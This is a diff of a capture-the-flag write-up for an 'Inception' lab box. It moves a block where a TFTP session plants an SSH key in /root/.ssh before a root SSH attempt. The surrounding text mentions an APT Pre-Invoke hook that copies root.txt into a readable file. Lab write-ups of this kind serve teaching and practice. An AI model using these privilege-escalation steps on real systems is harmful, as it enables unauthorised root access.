@@ -192,6 +192,19 @@ TFTP_ADDRESS=":69"
 TFTP_OPTIONS="--secure --create"
 ```
 
+
+Let's try something nice.
+
+```
+root@Inception:~/kqrk# tftp
+tftp> connect 192.168.0.1
+tftp> put kikka.pub /root/.ssh/id_rsa.pub
+Sent 397 bytes in 0.0 seconds
+tftp> quit
+root@Inception:~/kqrk# ssh -i kikka root@192.168.0.1
+The authenticity of host '192.168.0.1 (192.168.0.1)' can't be established.
+```
+
 TFTP allows writing a ssh key to /root/.ssh/authorized_keys but the file system access rights are not correct and SSH refuses login. GRAAAAH!
 
 
@@ -221,16 +234,6 @@ APT::Update::Pre-Invoke {"cat /root/root.txt > /root/.ssh/kikka.txt"; "chmod a+r
 
 So finally, APT runs our pre-invoke hook that does things!
 
-
-```
-root@Inception:~/kqrk# tftp
-tftp> connect 192.168.0.1
-tftp> put kikka.pub /root/.ssh/id_rsa.pub
-Sent 397 bytes in 0.0 seconds
-tftp> quit
-root@Inception:~/kqrk# ssh -i kikka root@192.168.0.1
-The authenticity of host '192.168.0.1 (192.168.0.1)' can't be established.
-```
 
 DONE!
 
